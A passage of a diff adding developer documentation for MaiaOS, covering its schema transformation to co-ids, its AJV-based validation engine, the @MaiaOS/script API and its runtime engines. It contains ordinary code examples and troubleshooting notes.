+**$schema**:
+- Points to the meta-schema that validates this schema
+- Can be human-readable (`@schema/meta`) or co-id (`co_z123...`)
+- Resolved dynamically during validation
+
+**$co**:
+- References another schema (for properties/items)
+- Can be human-readable (`@schema/actor`) or co-id (`co_z123...`)
+- Transformed to co-id during seeding
+
+**$ref**:
+- Internal schema reference (within same schema)
+- Uses JSON Schema `$ref` syntax (`#/$defs/...`)
+- Not transformed (stays as-is)
+
+---
+
+## Troubleshooting
+
+### Problem: "Schema missing required $schema field"
+
+**Solution:** Every schema must declare which meta-schema validates it:
+```json
+{
+  "$schema": "@schema/meta",
+  "$id": "@schema/actor",
+  ...
+}
+```
+
+### Problem: "No co-id found for query object schema"
+
+**Solution:** Make sure data collection schemas are registered before transforming instances:
+```javascript
+// Register data collection schema first
+coIdRegistry.register('@schema/todos', todosCoId);
+
+// Then transform instances that reference it
+transformInstanceForSeeding(instance, coIdMap);
+```
+
+### Problem: "Validation failed: must pass 'cotype' keyword validation"
+
+**Solution:** Add `cotype` to schema root for CoJSON types:
+```json
+{
+  "$schema": "@schema/meta",
+  "cotype": "comap",
+  "properties": { ... }
+}
+```
+
+---
+
+## Related Documentation
+
+- [Schema Definitions](../03_schemas.md) - Schema structure and usage
+- [Validation Engine Details](./validation.md) - How ValidationEngine works
+- [Schema Transformation](./transformation.md) - How transformation works
+- [CoJSON Integration](./cojson-integration.md) - CoJSON types support
+- [CoJSON Architecture](../architecture/cojson.md) - CoJSON system overview
+
+---
+
+## Source Files
+
+- Main entry: `libs/maia-schemata/src/index.js`
+- Validation engine: `libs/maia-schemata/src/validation.engine.js`
+- Validation helper: `libs/maia-schemata/src/validation.helper.js`
+- Schema transformer: `libs/maia-schemata/src/schema-transformer.js`
+- Co-ID generator: `libs/maia-schemata/src/co-id-generator.js`
+- AJV plugin: `libs/maia-schemata/src/ajv-co-types-plugin.js`
+
+---
+
+# MAIA SCHEMATA/TRANSFORMATION
+
+*Source: developers/03_maia-schemata/transformation.md*
+
+# Schema Transformation
+
+## Overview
+
+The schema transformation system converts human-readable references to co-ids during the seeding process. Think of it like translating a document from one language to another - the meaning stays the same, but the words change.
+
+**What it does:**
+- Transforms `@schema/actor` → `co_z123...`
+- Handles nested structures (query objects, tool payloads)
+- Preserves all data structure (only changes reference strings)
+- Works recursively through nested objects and arrays
+
+---
+
+## The Simple Version
+
+Imagine you have a recipe written in English, but you need to give it to someone who only speaks French. You translate the words, but keep the structure the same - "eggs" becomes "œufs", but you still need 2 of them.
+
+In MaiaOS:
+- **Before:** `{schema: "@schema/todos"}` (human-readable)
+- **After:** `{schema: "co_z123..."}` (co-id)
+- **Structure:** Same! Only the reference string changed.
+
+---
+
+## Transformation Flow
+
+### During Seeding
+
+```
+1. Load Schemas
+   └─> Read schema files
+   └─> Generate co-ids for each schema
+   └─> Build co-id map (@schema/actor → co_z123...)
+
+2. Transform Schemas
+   └─> Replace $schema references
+   └─> Replace $id references
+   └─> Replace $co references in properties
+   └─> Replace $ref references in $defs
+
+3. Transform Instances
+   └─> Transform query objects ({schema: "@schema/todos"})
+   └─> Transform tool payloads
+   └─> Transform action targets (@actor/vibe)
+   └─> Transform array items
+
+4. Store in IndexedDB
+   └─> All references are now co-ids
+   └─> Can be resolved without human-readable mappings
+```
+
+---
+
+## Key Functions
+
+### `transformSchemaForSeeding(schema, coIdMap)`
+
+Transforms a schema object, replacing all human-readable references with co-ids.
+
+**What it transforms:**
+- `$schema`: `"@schema/meta"` → `"co_z123..."`
+- `$id`: `"@schema/actor"` → `"co_z123..."`
+- `$co` in properties: `{ "$co": "@schema/view" }` → `{ "$co": "co_z456..." }`
+- `$ref` in `$defs`: `{ "$ref": "#/$defs/..." }` → (unchanged, internal reference)
+
+**Example:**
+```javascript
+const schema = {
+  $schema: '@schema/meta',
+  $id: '@schema/actor',
+  properties: {
+    viewRef: { $co: '@schema/view' }
+  }
+};
+
+const coIdMap = new Map([
+  ['@schema/meta', 'co_z111...'],
+  ['@schema/actor', 'co_z222...'],
+  ['@schema/view', 'co_z333...']
+]);
+
+const transformed = transformSchemaForSeeding(schema, coIdMap);
+// {
+//   $schema: 'co_z111...',
+//   $id: 'co_z222...',
+//   properties: {
+//     viewRef: { $co: 'co_z333...' }
+//   }
+// }
+```
+
+### `transformInstanceForSeeding(instance, coIdMap)`
+
+Transforms an instance (actor, context, etc.), replacing all human-readable references with co-ids.
+
+**What it transforms:**
+- Top-level `schema` field: `"@schema/todos"` → `"co_z123..."`
+- Query objects: `{schema: "@schema/todos", filter: {...}}` → `{schema: "co_z123...", filter: {...}}`
+- Tool payloads: `{tool: "@db", payload: {schema: "@schema/todos"}}` → `{tool: "@db", payload: {schema: "co_z123..."}}`
+- Action targets: `{tool: "@core/publishMessage", payload: {target: "@actor/vibe"}}` → `{tool: "@core/publishMessage", payload: {target: "co_z456..."}}`
+- Array items: `["@actor/vibe"]` → `["co_z456..."]`
+
+**Example:**
+```javascript
+const instance = {
+  schema: '@schema/todos',
+  todos: {
+    schema: '@schema/todos',
+    filter: { done: false }
+  }
+};
+
+const coIdMap = new Map([
+  ['@schema/todos', 'co_z123...']
+]);
+
+const transformed = transformInstanceForSeeding(instance, coIdMap);
+// {
+//   schema: 'co_z123...',
+//   todos: {
+//     schema: 'co_z123...',
+//     filter: { done: false }
+//   }
+// }
+```
+
+### `transformQueryObjects(obj, coIdMap)`
+
+Recursively transforms query objects in nested structures.
+
+**What it handles:**
+- Query objects: `{schema: "@schema/todos", filter: {...}}`
+- Tool payloads: `{tool: "@db", payload: {...}}`
+- Action payloads: `{tool: "@core/publishMessage", payload: {target: "@actor/vibe"}}`
+- Nested objects and arrays
+
+**Example:**
+```javascript
+const obj = {
+  context: {
+    todos: {
+      schema: '@schema/todos',
+      filter: { done: false }
+    }
+  },
+  actions: [
+    {
+      tool: '@core/publishMessage',
+      payload: {
+        target: '@actor/vibe'
+      }
+    }
+  ]
+};
+
+transformQueryObjects(obj, coIdMap);
+// All @schema/... and @actor/... references are now co-ids
+```
+
+---
+
+## Query Object Pattern
+
+### What Are Query Objects?
+
+Query objects are a special pattern used in context schemas to reference data collections:
+
+```json
+{
+  "todos": {
+    "schema": "@schema/todos",
+    "filter": { "done": false }
+  }
+}
+```
+
+**Structure:**
+- `schema`: Reference to data collection schema
+- `filter`: Optional filter criteria
+
+**Transformation:**
+- `schema` field is transformed to co-id
+- `filter` is preserved as-is
+
+### Runtime Transformation
+
+At runtime, query objects are transformed to arrays:
+
+```javascript
+// Before (schema definition):
+{
+  "todos": {
+    "schema": "@schema/todos",
+    "filter": { "done": false }
+  }
+}
+
+// After (runtime data):
+{
+  "todos": [
+    { "id": "1", "text": "Buy milk", "done": false },
+    { "id": "2", "text": "Walk dog", "done": false }
+  ]
+}
+```
+
+**Why:** The schema allows both object (query) and array (data) to accommodate this transformation.
+
+---
+
+## Tool Payload Transformation
+
+### Database Tool Payloads
+
+**Pattern:**
+```json
+{
+  "tool": "@db",
+  "payload": {
+    "schema": "@schema/todos",
+    "data": { "text": "Buy milk" }
+  }
+}
+```
+
+**Transformation:**
+- `payload.schema` is transformed to co-id
+- `payload.data` is preserved as-is
+
+### Action Tool Payloads
+
+**Pattern:**
+```json
+{
+  "tool": "@core/publishMessage",
+  "payload": {
+    "target": "@actor/vibe",
+    "message": { "type": "CREATE_TODO" }
+  }
+}
+```
+
+**Transformation:**
+- `payload.target` is transformed to co-id
+- `payload.message` is preserved as-is
+
+---
+
+## Helper Functions
+
+### `transformSchemaReference(schemaRef, coIdMap, context)`
+
+Transforms a single schema reference string.
+
+**Example:**
+```javascript
+const coId = transformSchemaReference('@schema/todos', coIdMap, 'query object');
+// Returns: 'co_z123...' or null if not found
+```
+
+### `transformTargetReference(targetRef, coIdMap, context)`
+
+Transforms a single target/actor reference string.
+
+**Example:**
+```javascript
+const coId = transformTargetReference('@actor/vibe', coIdMap, 'tool payload');
+// Returns: 'co_z456...' or null if not found
+```
+
+### `transformQueryObjectSchema(queryObj, coIdMap)`
+
+Transforms the `schema` field in a query object.
+
+**Example:**
+```javascript
+const queryObj = { schema: '@schema/todos', filter: {} };
+transformQueryObjectSchema(queryObj, coIdMap);
+// queryObj.schema is now 'co_z123...'
+```
+
+### `transformToolPayload(payload, coIdMap, transformRecursive)`
+
+Transforms tool payload, handling both schema and target references.
+
+**Example:**
+```javascript
+const payload = {
+  schema: '@schema/todos',
+  target: '@actor/vibe'
+};
+transformToolPayload(payload, coIdMap, transformQueryObjects);
+// Both schema and target are transformed
+```
+
+### `transformActionPayload(action, coIdMap, transformRecursive)`
+
+Transforms action payload, handling target references.
+
+**Example:**
+```javascript
+const action = {
+  tool: '@core/publishMessage',
+  payload: {
+    target: '@actor/vibe'
+  }
+};
+transformActionPayload(action, coIdMap, transformQueryObjects);
+// payload.target is transformed
+```
+
+### `transformArrayItems(arr, coIdMap, transformRecursive)`
+
+Transforms array items, handling both action payloads and direct actor references.
+
+**Example:**
+```javascript
+const arr = [
+  { tool: '@core/publishMessage', payload: { target: '@actor/vibe' } },
+  '@actor/user'
+];
+transformArrayItems(arr, coIdMap, transformQueryObjects);
+// Both items are transformed
+```
+
+---
+
+## Validation During Transformation
+
+### `validateNoNestedCoTypes(schema, path)`
+
+Validates that schemas don't have nested CoJSON types (must use `$co` keyword instead).
+
+**Why:** CoJSON types (comap, colist, costream) can only be at the schema root, not nested in properties.
+
+**Example:**
+```javascript
+// ❌ Wrong - nested cotype
+{
+  properties: {
+    items: {
+      cotype: 'colist'  // Can't nest CoJSON types!
+    }
+  }
+}
+
+// ✅ Correct - use $co instead
+{
+  properties: {
+    items: {
+      $co: '@schema/items'  // Reference to colist schema
+    }
+  }
+}
+```
+
+**Usage:**
+```javascript
+const errors = validateNoNestedCoTypes(schema);
+if (errors.length > 0) {
+  throw new Error(`Nested CoJSON types found: ${errors.join(', ')}`);
+}
+```
+
+---
+
+## Common Patterns
+
+### Transforming Before Seeding
+
+```javascript
+import { transformSchemaForSeeding, transformInstanceForSeeding } from '@MaiaOS/schemata/schema-transformer';
+
+// Build co-id map
+const coIdMap = new Map();
+for (const [name, schema] of Object.entries(schemas)) {
+  const coId = generateCoId(schema);
+  coIdMap.set(`@schema/${name}`, coId);
+}
+
+// Transform schemas
+const transformedSchemas = {};
+for (const [name, schema] of Object.entries(schemas)) {
+  transformedSchemas[name] = transformSchemaForSeeding(schema, coIdMap);
+}
+
+// Transform instances
+const transformedInstances = {};
+for (const [name, instance] of Object.entries(instances)) {
+  transformedInstances[name] = transformInstanceForSeeding(instance, coIdMap);
+}
+```
+
+### Handling Missing References
+
+```javascript
+const coId = coIdMap.get('@schema/todos');
+if (!coId) {
+  console.warn('No co-id found for @schema/todos');
+  // Option 1: Skip transformation (leave as-is)
+  // Option 2: Generate co-id on-the-fly
+  // Option 3: Throw error (fail fast)
+}
+```
+
+---
+
+## Troubleshooting
+
+### Problem: "No co-id found for query object schema"
+
+**Solution:** Register data collection schemas before transforming instances:
+```javascript
+// Phase 1: Register data collection schemas
+coIdRegistry.register('@schema/todos', todosCoId);
+
+// Phase 2: Transform instances (now todosCoId is available)
+transformInstanceForSeeding(instance, coIdMap);
+```
+
+### Problem: Query object not transformed
+
+**Solution:** Make sure you're calling `transformQueryObjects` recursively:
+```javascript
+// This only transforms top-level
+transformQueryObjects(instance, coIdMap);
+
+// For nested structures, transformation is recursive automatically
+```
+
+### Problem: "Nested CoJSON types found"
+
+**Solution:** Use `$co` keyword instead of nesting `cotype`:
+```json
+// ❌ Wrong
+{
+  "properties": {
+    "items": { "cotype": "colist" }
+  }
+}
+
+// ✅ Correct
+{
+  "properties": {
+    "items": { "$co": "@schema/items" }
+  }
+}
+```
+
+---
+
+## Source Files
+
+- Main transformer: `libs/maia-schemata/src/schema-transformer.js`
+- Helper functions: `libs/maia-schemata/src/schema-transformer.js` (transformSchemaReference, transformTargetReference, etc.)
+
+---
+
+# MAIA SCHEMATA/VALIDATION
+
+*Source: developers/03_maia-schemata/validation.md*
+
+# Validation Engine
+
+## Overview
+
+The `ValidationEngine` is the heart of MaiaOS's schema validation system. Think of it as a smart quality inspector that checks if your data matches the blueprint (schema) you defined.
+
+**What it does:**
+- Loads and compiles JSON schemas using AJV
+- Validates data against schemas with detailed error messages
+- Resolves schema dependencies ($schema, $co references)
+- Supports both human-readable IDs and co-ids
+- Handles CoJSON types via custom plugin
+
+---
+
+## The Simple Version
+
+Imagine you're building a LEGO set. The instruction manual (schema) says "use 4 red blocks here." The ValidationEngine is like a friend checking your work - it looks at what you built and says "✅ You used 4 red blocks, perfect!" or "❌ You used 3 red blocks and 1 blue block, that's wrong!"
+
+**Example:**
+```javascript
+// Schema says: "actor must have a 'name' field that's a string"
+const schema = {
+  type: 'object',
+  properties: {
+    name: { type: 'string' }
+  },
+  required: ['name']
+};
+
+// You provide this data:
+const data = { name: 'my-actor' };
+
+// ValidationEngine checks:
+const result = await engine.validate('actor', data);
+// ✅ result.valid = true
+```
+
+---
+
+## Architecture
+
+### Core Components
+
+```
+ValidationEngine
+├── AJV Instance (compiles schemas)
+├── Schema Cache (Map<type, validator>)
+├── Schema Resolver (resolves co-id references)
+└── Meta-Schema Registry (validates schemas themselves)
+```
+
+### Initialization Flow
+
+```
+1. Create ValidationEngine
+   └─> Sets up empty cache and resolver
+
+2. Initialize AJV
+   └─> Loads AJV library (local import or CDN fallback)
+   └─> Configures AJV options (allErrors, verbose, etc.)
+   └─> Registers base meta-schema (JSON Schema Draft 2020-12)
+   └─> Registers CoJSON meta-schema (@schema/meta)
+   └─> Registers CoJSON plugin (cotype, $co keywords)
+
+3. Load Schemas
+   └─> Get schema from registry
+   └─> Resolve dependencies ($schema, $co references)
+   └─> Compile with AJV
+   └─> Cache compiled validator
+```
+
+---
+
+## Key Methods
+
+### `initialize()`
+
+Sets up the AJV instance and registers meta-schemas.
+
+**What happens:**
+1. Loads AJV library (tries local import, falls back to CDN)
+2. Creates AJV instance with validation options
+3. Registers base meta-schema (JSON Schema Draft 2020-12)
+4. Registers CoJSON meta-schema (@schema/meta)
+5. Registers CoJSON plugin (adds `cotype` and `$co` keywords)
+
+**Example:**
+```javascript
+const engine = new ValidationEngine();
+await engine.initialize();
+// Now ready to validate!
+```
+
+### `loadSchema(type, schema)`
+
+Loads and compiles a schema for a given type.
+
+**What happens:**
+1. Checks if schema already loaded (returns cached validator)
+2. Resolves all dependencies ($schema, $co references)
+3. Registers dependencies in AJV
+4. Compiles schema with AJV
+5. Caches compiled validator
+
+**Example:**
+```javascript
+const actorSchema = getSchema('actor');
+await engine.loadSchema('actor', actorSchema);
+// Schema is now compiled and cached
+```
+
+### `validate(type, data)`
+
+Validates data against a loaded schema.
+
+**What happens:**
+1. Gets compiled validator from cache
+2. Runs data through validator
+3. Formats errors (if any)
+4. Returns validation result
+
+**Example:**
+```javascript
+const result = await engine.validate('actor', actorData);
+if (!result.valid) {
+  console.error('Errors:', result.errors);
+  // [
+  //   {
+  //     instancePath: '/name',
+  //     message: 'must be string',
+  //     ...
+  //   }
+  // ]
+}
+```
+
+### `validateSchemaAgainstMeta(schema)`
+
+Validates a schema itself against its meta-schema.
+
+**What happens:**
+1. Determines which meta-schema to use (from `$schema` field)
+2. Resolves meta-schema if it's a co-id reference
+3. Gets or registers meta-schema validator
+4. Validates schema against meta-schema
+5. Returns validation result
+
+**Example:**
+```javascript
+const schema = {
+  $schema: '@schema/meta',
+  cotype: 'comap',
+  properties: { ... }
+};
+
+const result = await engine.validateSchemaAgainstMeta(schema);
+// Checks if schema follows CoJSON meta-schema rules
+```
+
+---
+
+## Dependency Resolution
+
+### How It Works
+
+When loading a schema, the engine must resolve all its dependencies first:
+
+```
+Schema A references Schema B via $co
+  └─> Load Schema B
+      └─> Schema B references Schema C via $co
+          └─> Load Schema C
+              └─> (no more dependencies)
+          └─> Register Schema C in AJV
+      └─> Register Schema B in AJV
+  └─> Register Schema A in AJV
+  └─> Compile Schema A (now all references resolve)
+```
+
+### Resolving $schema References
+
+**Human-readable:**
+```json
+{
+  "$schema": "@schema/meta"
+}
+```
+→ Uses `@schema/meta` validator directly
+
+**Co-id reference:**
+```json
+{
+  "$schema": "co_z123..."
+}
+```
+→ Resolves co-id to get meta-schema
+→ Determines type (CoJSON vs standard)
+→ Uses appropriate validator
+
+### Resolving $co References
+
+**Human-readable:**
+```json
+{
+  "properties": {
+    "actorRef": { "$co": "@schema/actor" }
+  }
+}
+```
+→ Resolves `@schema/actor` to get schema
+→ Registers schema in AJV
+→ Compiles property validator
+
+**Co-id reference:**
+```json
+{
+  "properties": {
+    "actorRef": { "$co": "co_z123..." }
+  }
+}
+```
+→ Resolves co-id to get schema
+→ Registers schema in AJV
+→ Compiles property validator
+
+---
+
+## Schema Resolver
+
+The schema resolver is a function that loads schemas from IndexedDB.
+
+**Purpose:**
+- Resolves co-id references to actual schema objects
+- Handles reference objects (from IndexedDB mapping)
+- Supports both human-readable IDs and co-ids
+
+**Example:**
+```javascript
+const resolver = async (id) => {
+  // id could be '@schema/actor' or 'co_z123...'
+  const schema = await dbEngine.backend.getSchema(id);
+  return schema;
+};
+
+engine.setSchemaResolver(resolver);
+```
+
+**How it's used:**
+1. During `loadSchema()`, if schema has `$schema: "co_z123..."`, resolver loads the meta-schema
+2. During dependency resolution, if schema has `$co: "co_z123..."`, resolver loads the referenced schema
+3. Resolver handles both human-readable IDs and co-ids automatically
+
+---
+
+## Error Formatting
+
+Validation errors are formatted for readability:
+
+**AJV Error:**
+```javascript
+{
+  instancePath: '/properties/name',
+  schemaPath: '#/properties/name/type',
+  keyword: 'type',
+  message: 'must be string',
+  params: { type: 'string' }
+}
+```
+
+**Formatted Error:**
+```javascript
+{
+  instancePath: '/properties/name',
+  schemaPath: '#/properties/name/type',
+  keyword: 'type',
+  message: 'must be string',
+  params: { type: 'string' }
+}
+// Same structure, but consistent formatting
+```
+
+**Error Helper:**
+```javascript
+import { formatValidationErrors } from './validation.helper.js';
+
+const errors = validate.errors || [];
+const formatted = formatValidationErrors(errors);
+// All errors have consistent structure
+```
+
+---
+
+## Meta-Schema Handling
+
+### Base Meta-Schema
+
+**Purpose:** Validates standard JSON Schema schemas
+
+**ID:** `https://json-schema.org/draft/2020-12/schema`
+
+**Location:** `os/base-meta-schema.json`
+
+**Usage:**
+- Validates schemas that don't use CoJSON types
+- Used for validating the base meta-schema itself (self-validation)
+
+### CoJSON Meta-Schema
+
+**Purpose:** Validates MaiaOS schemas with CoJSON types
+
+**ID:** `@schema/meta`
+
+**Location:** `os/meta.schema.json`
+
+**Features:**
+- Extends base meta-schema
+- Adds `cotype` keyword (comap, colist, costream)
+- Adds `$co` keyword (co-id references)
+- Requires `title` field for all schemas
+
+**Usage:**
+```json
+{
+  "$schema": "@schema/meta",
+  "title": "Actor Schema",
+  "cotype": "comap",
+  "properties": {
+    "name": { "type": "string" },
+    "viewRef": { "$co": "@schema/view" }
+  }
+}
+```
+
+---
+
+## Self-Validation
+
+Meta-schemas can validate themselves, but this creates a circular dependency:
+
+```
+Meta-schema validates schemas
+  └─> Meta-schema is itself a schema
+      └─> Meta-schema validates itself
+          └─> (circular!)
+```
+
+**Solution:** Temporarily disable schema validation during meta-schema registration:
+
+```javascript
+withSchemaValidationDisabled(ajv, () => {
+  ajv.addMetaSchema(metaSchema, metaSchema.$id);
+});
+```
+
+This allows meta-schemas to be registered without validating themselves.
+
+---
+
+## Performance Considerations
+
+### Caching
+
+**Schema Compilation:**
+- Schemas are compiled once and cached
+- Subsequent validations use cached validators
+- Cache key: schema type (e.g., 'actor', 'context')
+
+**Dependency Resolution:**
+- Dependencies are resolved once per schema load
+- Resolved schemas are registered in AJV (AJV caches internally)
+- No redundant resolution
+
+### Lazy Loading
+
+**Schemas:**
+- Schemas are loaded on-demand (when `loadSchema()` is called)
+- Not all schemas are loaded at startup
+- Reduces initial load time
+
+**Meta-Schemas:**
+- Base meta-schema loaded during `initialize()`
+- CoJSON meta-schema loaded during `initialize()`
+- Other meta-schemas loaded on-demand
+
+---
+
+## Common Patterns
+
+### Validating a Single File
+
+```javascript
+import { ValidationEngine, getSchema } from '@MaiaOS/schemata';
+
+const engine = new ValidationEngine();
+await engine.initialize();
+
+const schema = getSchema('actor');
+await engine.loadSchema('actor', schema);
+
+const result = await engine.validate('actor', actorData);
+if (!result.valid) {
+  throw new Error(`Validation failed: ${result.errors[0].message}`);
+}
+```
+
+### Validating Multiple Files
+
+```javascript
+const types = ['actor', 'context', 'state', 'view'];
+
+// Load all schemas
+for (const type of types) {
+  const schema = getSchema(type);
+  await engine.loadSchema(type, schema);
+}
+
+// Validate all files
+for (const [type, data] of files) {
+  const result = await engine.validate(type, data);
+  if (!result.valid) {
+    console.error(`${type} validation failed:`, result.errors);
+  }
+}
+```
+
+### Using Schema Resolver
+
+```javascript
+const engine = new ValidationEngine();
+engine.setSchemaResolver(async (id) => {
+  // Load from IndexedDB
+  return await dbEngine.backend.getSchema(id);
+});
+
+await engine.initialize();
+
+// Now schemas with co-id references will resolve automatically
+const schema = {
+  $schema: 'co_z123...',  // Will be resolved!
+  properties: {
+    ref: { $co: 'co_z456...' }  // Will be resolved!
+  }
+};
+
+await engine.loadSchema('my-type', schema);
+```
+
+---
+
+## Troubleshooting
+
+### Problem: "Schema 'actor' not loaded"
+
+**Solution:** Call `loadSchema()` before `validate()`:
+```javascript
+await engine.loadSchema('actor', actorSchema);
+const result = await engine.validate('actor', data);
+```
+
+### Problem: "Unknown meta schema 'co_z123...'"
+
+**Solution:** Set schema resolver to resolve co-id references:
+```javascript
+engine.setSchemaResolver(async (id) => {
+  return await dbEngine.backend.getSchema(id);
+});
+```
+
+### Problem: "Schema resolver returned null for $co reference"
+
+**Solution:** Make sure referenced schema is registered before loading:
+```javascript
+// Register dependency first
+await engine.loadSchema('view', viewSchema);
+
+// Then load schema that references it
+await engine.loadSchema('actor', actorSchema);
+```
+
+---
+
+## Source Files
+
+- Implementation: `libs/maia-schemata/src/validation.engine.js`
+- Helper functions: `libs/maia-schemata/src/validation.helper.js`
+- Error formatting: `libs/maia-schemata/src/validation.helper.js` (formatValidationErrors)
+- Schema validation toggle: `libs/maia-schemata/src/validation.helper.js` (withSchemaValidationDisabled)
+
+---
+
+# MAIA SCRIPT/API REFERENCE
+
+*Source: developers/04_maia-script/api-reference.md*
+
+# API Reference
+
+Complete API reference for `@MaiaOS/script` package.
+
+---
+
+## Exported Engines
+
+All engines are exported from `@MaiaOS/script`:
+
+```javascript
+import {
+  ActorEngine,
+  ViewEngine,
+  StyleEngine,
+  StateEngine,
+  ToolEngine,
+  MaiaScriptEvaluator,
+  ModuleRegistry,
+  DBEngine,
+  IndexedDBBackend,
+  SubscriptionEngine,
+  MessageQueue
+} from '@MaiaOS/script';
+```
+
+---
+
+## Subpath Exports
+
+Modules and engines are available via subpath exports:
+
+```javascript
+// Modules
+import { register } from '@MaiaOS/script/modules/db.module.js';
+
+// Engines (if needed)
+import { ActorEngine } from '@MaiaOS/script/engines/actor-engine/actor.engine.js';
+```
+
+---
+
+## Using Engines Directly
+
+For advanced use cases, you can use engines independently:
+
+### Custom Evaluator
+
+```javascript
+import { MaiaScriptEvaluator } from '@MaiaOS/script';
+
+const evaluator = new MaiaScriptEvaluator(null, {
+  maxDepth: 100,
+  validateExpressions: true
+});
+
+const result = await evaluator.evaluate(
+  { $if: { condition: true, then: 'yes', else: 'no' } },
+  { context: {}, item: {} }
+);
+```
+
+### Custom View Renderer
+
+```javascript
+import { ViewEngine, MaiaScriptEvaluator, ModuleRegistry } from '@MaiaOS/script';
+
+const evaluator = new MaiaScriptEvaluator();
+const registry = new ModuleRegistry();
+const viewEngine = new ViewEngine(evaluator, null, registry);
+
+// Render a view without full actor system
+await viewEngine.render(viewDef, { context: {} }, shadowRoot, [], 'custom');
+```
+
+### Custom Database Operations
+
+```javascript
+import { DBEngine, IndexedDBBackend } from '@MaiaOS/script';
+
+const backend = new IndexedDBBackend();
+await backend.init();
+const dbEngine = new DBEngine(backend);
+
+// Use database directly
+const result = await dbEngine.execute({
+  op: 'query',
+  schema: '@schema/todos'
+});
+```
+
+---
+
+## Package Exports
+
+The package exports are defined in `libs/maia-script/package.json`:
+
+```json
+{
+  "exports": {
+    ".": "./src/index.js",
+    "./modules/*": "./src/modules/*",
+    "./engines/*": "./src/engines/*"
+  }
+}
+```
+
+---
+
+## Related Documentation
+
+- [Main README](./README.md) - Package overview
+- [engines.md](./engines.md) - Detailed engine descriptions
+- [modules.md](./modules.md) - Module system
+- [expressions.md](./expressions.md) - Expression language
+- [patterns.md](./patterns.md) - Common patterns
+
+---
+
+# MAIA SCRIPT/ENGINES
+
+*Source: developers/04_maia-script/engines.md*
+
+# Engines
+
+The `@MaiaOS/script` package provides 10 core engines that work together to execute MaiaScript and manage actor lifecycles.
+
+---
+
+## MaiaScriptEvaluator
+
+**Purpose:** Evaluates MaiaScript expressions safely.
+
+**What it does:**
+- Evaluates JSON-based expressions (`$if`, `$eq`, `$context`, etc.)
+- Resolves data paths (`$context.title`, `$item.id`)
+- Validates expressions against schema
+- Enforces depth limits to prevent DoS attacks
+
+**Key Methods:**
+- `evaluate(expression, data, depth)` - Evaluate an expression
+- `evaluateShortcut(expression, data)` - Handle `$key` shortcuts
+
+**Example:**
+```javascript
+import { MaiaScriptEvaluator } from '@MaiaOS/script';
+
+const evaluator = new MaiaScriptEvaluator();
+
+// Evaluate a simple expression
+const result = await evaluator.evaluate(
+  { $if: { condition: { $eq: ['$context.status', 'active'] }, then: 'green', else: 'gray' } },
+  { context: { status: 'active' } }
+);
+// Returns: 'green'
+```
+
+**Security:**
+- Validates expressions before evaluation
+- Enforces maximum recursion depth (default: 50)
+- Sandboxed - only whitelisted operations allowed
+
+**Source:** `libs/maia-script/src/engines/MaiaScriptEvaluator.js`
+
+---
+
+## ActorEngine
+
+**Purpose:** Orchestrates actor lifecycle and coordinates all engines.
+
+**What it does:**
+- Creates and manages actors
+- Handles message passing (inbox/subscriptions)
+- Coordinates ViewEngine, StyleEngine, StateEngine
+- Manages actor context and state
+- Processes messages and triggers state transitions
+
+**Key Methods:**
+- `createActor(actorConfig, container)` - Create an actor
+- `loadActor(actorId)` - Load actor config from database
+- `sendMessage(actorId, message)` - Send message to actor
+- `processMessages(actorId)` - Process pending messages
+- `getActor(actorId)` - Get actor by ID
+- `rerenderActor(actorId)` - Re-render actor view
+
+**Dependencies:**
+- `StyleEngine` - For style compilation
+- `ViewEngine` - For view rendering
+- `ModuleRegistry` - For module access
+- `ToolEngine` - For tool execution
+- `StateEngine` - For state machine interpretation
+- `SubscriptionEngine` - For reactive subscriptions
+
+**Example:**
+```javascript
+import { ActorEngine } from '@MaiaOS/script';
+
+// ActorEngine is typically created by kernel during boot
+// But you can create it manually for advanced use cases:
+const actorEngine = new ActorEngine(
+  styleEngine,
+  viewEngine,
+  moduleRegistry,
+  toolEngine,
+  stateEngine
+);
+
+// Create an actor
+const actor = await actorEngine.createActor(
+  actorConfig,
+  document.getElementById('container')
+);
+```
+
+**Source:** `libs/maia-script/src/engines/actor-engine/actor.engine.js`
+
+---
+
+## ViewEngine
+
+**Purpose:** Renders `.maia` view definitions to Shadow DOM.
+
+**What it does:**
+- Converts view definitions to DOM elements
+- Handles `$each` loops for iteration
+- Processes `$slot` for actor composition
+- Manages event handlers (`$on`)
+- Uses Shadow DOM for style isolation
+- Sanitizes HTML to prevent XSS
+
+**Key Methods:**
+- `loadView(coId)` - Load view definition from database
+- `render(viewDef, context, shadowRoot, styleSheets, actorId)` - Render view
+- `renderNode(nodeDef, data, actorId)` - Render a single node
+
+**Dependencies:**
+- `MaiaScriptEvaluator` - For expression evaluation
+- `ActorEngine` - For action handling
+- `ModuleRegistry` - For module access
+
+**Example:**
+```javascript
+import { ViewEngine } from '@MaiaOS/script';
+
+const viewEngine = new ViewEngine(evaluator, actorEngine, moduleRegistry);
+
+// Render a view
+await viewEngine.render(
+  viewDef,
+  { context: { title: 'Hello' } },
+  shadowRoot,
+  styleSheets,
+  'actor-123'
+);
+```
+
+**Security:**
+- Uses `textContent` for text (auto-escapes HTML)
+- Uses `createElement`/`appendChild` for DOM (safe)
+- Sanitizes attribute values
+- Shadow DOM isolation prevents style leakage
+
+**Source:** `libs/maia-script/src/engines/view-engine/view.engine.js`
+
+---
+
+## StyleEngine
+
+**Purpose:** Compiles `.maia` style definitions to CSS.
+
+**What it does:**
+- Compiles style definitions to Constructable Stylesheets
+- Merges brand styles with actor overrides
+- Interpolates token references (`{token.color}`)
+- Caches compiled stylesheets
+- Supports CSS-in-JS approach
+
+**Key Methods:**
+- `loadStyle(coId)` - Load style definition from database
+- `compile(brandStyleId, actorStyleId)` - Compile styles
+- `clearCache()` - Clear style cache (dev only)
+
+**Dependencies:**
+- `DBEngine` - For loading style definitions
+
+**Example:**
+```javascript
+import { StyleEngine } from '@MaiaOS/script';
+
+const styleEngine = new StyleEngine();
+
+// Compile styles
+const styleSheets = await styleEngine.compile(
+  'co_z...brand',  // Brand style co-id
+  'co_z...actor'   // Actor style co-id (optional)
+);
+```
+
+**Source:** `libs/maia-script/src/engines/style-engine/style.engine.js`
+
+---
+
+## StateEngine
+
+**Purpose:** Interprets state machine definitions (XState-like).
+
+**What it does:**
+- Loads state machine definitions from `.state.maia` files
+- Creates state machine instances
+- Handles state transitions with guards
+- Executes entry/exit actions
+- Processes events (`send('EVENT_NAME')`)
+- Supports side effects (invoke, after delays)
+
+**Key Methods:**
+- `loadStateDef(stateRef)` - Load state definition
+- `createMachine(stateDef, actor)` - Create state machine instance
+- `sendEvent(actorId, event)` - Send event to state machine
+
+**Dependencies:**
+- `ToolEngine` - For executing actions
+- `MaiaScriptEvaluator` - For evaluating guards
